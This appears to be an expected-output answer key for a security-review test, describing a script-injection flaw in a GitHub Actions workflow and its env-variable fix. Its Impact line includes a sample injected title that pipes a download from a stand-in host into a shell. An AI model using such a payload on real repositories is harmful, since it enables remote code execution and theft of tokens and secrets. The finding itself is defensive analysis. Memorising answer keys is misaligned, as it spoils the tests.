# Expected Output: Script Injection via Untrusted Input

**Finding:** Attacker-controlled `github.event.issue.title` is expanded directly into a `run:` shell step

**Evidence:** `.github/workflows/pr-comment.yml` — `run: echo "Title is ${{ github.event.issue.title }}"` and `run: ./build.sh "${{ github.head_ref }}"`

**Impact:** An issue title / branch name like `"; curl evil | sh; #` executes arbitrary commands in a context that holds `GITHUB_TOKEN` and secrets (RCE). Quoting does not help because the expression is substituted before the shell parses it.

**Fix:** Pass the values through `env:` so they become shell variables instead of inlined script:

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Title is $TITLE"
```

**Severity:** critical
**Confidence:** high
